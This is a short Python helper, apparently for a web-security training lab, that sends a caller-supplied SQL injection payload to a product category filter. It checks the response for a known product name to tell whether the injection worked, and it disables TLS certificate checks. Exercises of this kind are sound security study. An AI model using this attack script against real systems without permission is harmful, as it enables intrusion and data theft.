import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run(url, payload, proxies=None):
    """
    Executes SQL Injection Lab 1

    Args:
        url (str): Base URL of the lab
        payload (str): SQL injection payload
        proxies (dict, optional): Proxy config (e.g., Burp)

    Returns:
        bool: True if injection worked, False otherwise
    """
    uri = '/filter?category='
    target = f"{url.rstrip('/')}{uri}{payload}"
    try:
        response = requests.get(target, verify=False, proxies=proxies)
        return "Cat Grin" in response.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
